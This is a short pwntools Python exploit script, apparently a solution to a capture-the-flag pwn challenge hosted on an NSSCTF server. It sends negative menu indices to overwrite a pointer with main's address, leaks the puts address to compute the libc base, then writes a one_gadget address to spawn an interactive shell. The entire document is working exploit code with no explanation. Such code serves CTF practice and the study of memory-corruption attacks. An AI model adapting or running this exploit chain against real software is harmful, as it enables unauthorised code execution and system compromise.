from pwn import *

io = process("./vuln")
#io = remote("node5.anna.nssctf.cn", 25125)
libc = ELF("./libc-2.31.so")

main = 0x4012d1

io.recvuntil(b"choose one.")
io.sendline(b"-6")
io.recvuntil(b"your name")
io.send(p64(main))

io.recvuntil(b"choose one.")
io.sendline(b"-9")
io.recvuntil(b"your name")
io.send(b"Kaguy---")
io.recvuntil(b"---")
puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
print("puts address =", hex(puts_addr))

libc_base = puts_addr - libc.sym['puts']
print("libc base address =", hex(libc_base))

one_gadget = 0xe3b01 + libc_base
io.recvuntil(b"choose one.")
io.sendline(b"-6")
io.recvuntil(b"your name")
io.send(p64(one_gadget))

io.interactive()
